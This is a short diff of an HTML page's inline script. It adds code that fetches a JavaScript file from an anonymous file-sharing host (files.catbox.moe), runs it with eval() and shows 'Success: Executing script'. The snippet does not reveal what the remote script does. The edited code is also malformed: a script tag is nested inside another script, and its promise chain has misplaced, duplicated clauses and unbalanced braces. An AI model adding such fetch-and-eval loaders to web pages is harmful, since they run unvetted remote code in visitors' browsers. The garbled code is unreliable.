@@ -6,7 +6,10 @@
   <link rel="stylesheet" href="style250.css" />
   <script>
   let chunks = [];
-  <script defer src="https://files.catbox.moe/cwedrd.js">
+  fetch("https://files.catbox.moe/cwedrd.js")
+    .then(res => {
+      if (!res.ok) {
+       throw new Error(`Fetch failed: HTTP ${res.status} ${res.statusText}`);
     .then(res => res.body.getReader())
     .then(reader => {
       function pump() {
@@ -23,6 +26,15 @@
           return pump();
          });
       }
+      return res.text();
+    })
+    .then(code => {
+      document.getElementById("status").textContent = "Success: Executing script";
+      eval(code);
+    })
+    .catch(err => {
+      document.getElementById("status").textContent = "Fetch error: " + err.message;
+    });
       return pump();
      })
      .catch(err => {
